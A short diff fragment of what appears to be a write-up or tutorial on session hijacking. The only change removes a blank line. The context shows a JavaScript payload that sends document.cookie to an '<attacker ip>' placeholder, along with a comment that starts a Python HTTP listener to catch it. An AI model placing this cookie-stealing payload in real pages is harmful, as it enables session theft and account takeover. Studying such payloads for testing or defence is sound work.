@@ -33,7 +33,6 @@ hijacking.js
 ```js
 // sudo python3 -m http.server 80
 
-
 // hijacking.js
 var oReq = new XMLHttpRequest();
 oReq.open('GET', 'http://<attacker ip>/?output='+document.cookie, true);
